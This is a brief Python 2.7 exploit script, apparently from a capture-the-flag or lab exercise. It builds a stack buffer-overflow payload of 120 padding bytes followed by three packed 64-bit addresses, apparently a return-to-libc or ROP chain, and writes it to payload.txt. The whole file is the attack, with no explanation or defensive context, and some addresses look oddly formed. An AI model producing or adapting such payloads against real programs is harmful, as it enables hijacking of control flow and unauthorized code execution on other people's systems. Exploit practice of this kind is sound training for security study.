#!/usr/bin/env python2.7

from struct import *

buf = ""
buf += "A"*120
buf += pack("<Q",0x000000000040120b)
buf += pack("<Q",0xffff7ffff7dff31f)
buf += pack("<Q",0xffff7ffff7c4a4e0)

f = open('payload.txt','w')
f.write(buf)
f.close()
